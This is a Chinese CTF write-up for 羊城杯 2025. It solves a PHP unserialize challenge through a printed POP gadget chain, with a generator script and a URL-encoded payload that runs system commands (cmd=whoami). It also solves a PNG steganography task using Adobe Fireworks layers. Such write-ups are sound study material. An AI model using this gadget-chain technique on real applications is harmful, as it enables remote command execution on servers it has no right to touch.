---
title: 羊城杯 2025 WP
categories:
- CTF
tag:
- misc
- web
- PHP
- 反序列化
- 图片隐写
- WriteUp
date: 2025-10-20 13:58:32
excerpt: 做出来不多，继续努力
index_img: /img/羊城杯2025WP/0abd87eaa8c138fbafe80897ad42627e.jpeg
banner_img: /img/羊城杯2025WP/0abd87eaa8c138fbafe80897ad42627e.jpeg
---

# 羊城杯 2025 WP

只做出来两题...

# Web

## ez_unserialize

php 反序列化，相对是比较简单的，参考一下[以前的笔记](https://5i1encee.github.io/2025/02/01/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/)

```bash
<?php

error_reporting(0);
highlight_file(__FILE__);

class A {
    public $first;
    public $step;
    public $next;

    public function __construct() {
        $this->first = "继续加油！";
    }

    public function start() {
        echo $this->next;
    }
}

class E {
    private $you;
    public $found;
    private $secret = "admin123";

    public function __get($name){
        if($name === "secret") {
            echo "<br>".$name." maybe is here!</br>";
            $this->found->check();
        }
    }
}

class F {
    public $fifth;
    public $step;
    public $finalstep;

    public function check() {
        if(preg_match("/U/",$this->finalstep)) {
            echo "仔细想想！";
        }
        else {
            $this->step = new $this->finalstep();
            ($this->step)();
        }
    }
}

class H {
    public $who;
    public $are;
    public $you;

    public function __construct() {
        $this->you = "nobody";
    }

    public function __destruct() {
        $this->who->start();
    }
}

class N {
    public $congratulation;
    public $yougotit;

    public function __call(string $func_name, array $args) {
        return call_user_func($func_name,$args[0]);
    }
}

class U {
    public $almost;
    public $there;
    public $cmd;

    public function __construct() {
        $this->there = new N();
        $this->cmd = $_POST['cmd'];
    }

    public function __invoke() {
        return $this->there->system($this->cmd);
    }
}

class V {
    public $good;
    public $keep;
    public $dowhat;
    public $go;

    public function __toString() {
        $abc = $this->dowhat;
        $this->go->$abc;
        return "<br>Win!!!</br>";
    }
}

unserialize($_POST['payload']);

?>
```

unserialize 利用链如下

H:__destruct():start()

A:start():echo $this->next

V:__toString():$this->go->$abc

E:__get($name):found->check()

F:check():($this->step)()

U:__invoke():system($this->cmd)

N:__call():call_user_func

```bash
<?php

class A {
    public $first;
    public $step;
    public $next;
}

class E {
    public $found;
}

class F {
    public $finalstep;
}

class H {
    public $who;
}

class V {
    public $dowhat;
    public $go;
}

class U {
    public $there;
    public $cmd;
}

class N {
}

$n = new N();

$u = new U();
$u->there = $n;

$f = new F();
$f->finalstep = "u";

$e = new E();
$e->found = $f;

$v = new V();
$v->dowhat = "secret";
$v->go = $e;

$a = new A();
$a->next = $v;

$h = new H();
$h->who = $a;

echo urlencode(serialize($h));

?>
```

```http
payload=O%3A1%3A%22H%22%3A1%3A%7Bs%3A3%3A%22who%22%3BO%3A1%3A%22A%22%3A3%3A%7Bs%3A5%3A%22first%22%3BN%3Bs%3A4%3A%22step%22%3BN%3Bs%3A4%3A%22next%22%3BO%3A1%3A%22V%22%3A2%3A%7Bs%3A6%3A%22dowhat%22%3Bs%3A6%3A%22secret%22%3Bs%3A2%3A%22go%22%3BO%3A1%3A%22E%22%3A1%3A%7Bs%3A5%3A%22found%22%3BO%3A1%3A%22F%22%3A1%3A%7Bs%3A9%3A%22finalstep%22%3Bs%3A1%3A%22u%22%3B%7D%7D%7D%7D%7D&cmd=whoami
```

# Misc

## 成功男人背后的女人

先把所有常规的隐写试了一遍都不对

然后去仔细看了一下里面的数据块内容，发现有一大坨 mkBT 类型的非 PNG 常规数据块（前面还有一点 prVW、mkBF、mkTS、mkBS 这些）

![](/img/羊城杯2025WP/Sl7bbkEwXo4Ye3xLUbwceQtAnpf.png)

于是去搜索 mkBT 的来历，发现往年一道虎符的题 [https://lovebear.top/2020/08/18/CTF_PngAnalyse/](https://lovebear.top/2020/08/18/CTF_PngAnalyse/)，这个是 Adobe 的专属数据块，在 tweakpng 也可以看到，所以尝试依葫芦画瓢用 Adobe 的 Fireworks8 查看图片

![](/img/羊城杯2025WP/E0WvbLQ3CoqrQrxM0tPcrAErnxS.png)

发现新图层

![](/img/羊城杯2025WP/TorBbSVduomDhgx2H6LcuO7YnRh.png)

下面有神秘信息

![](/img/羊城杯2025WP/AndJbLGeQoUX2axmFVCcSGOAnsf.png)

猜测为 01 串

```
01000100010000010101001101000011
01010100010001100111101101110111
00110000011011010100010101001110
01011111011000100110010101101000
00110001011011100100010001011111
01001101010001010110111001111101
```

转 ascii 得 DASCTF{w0mEN_beh1nD_MEn}
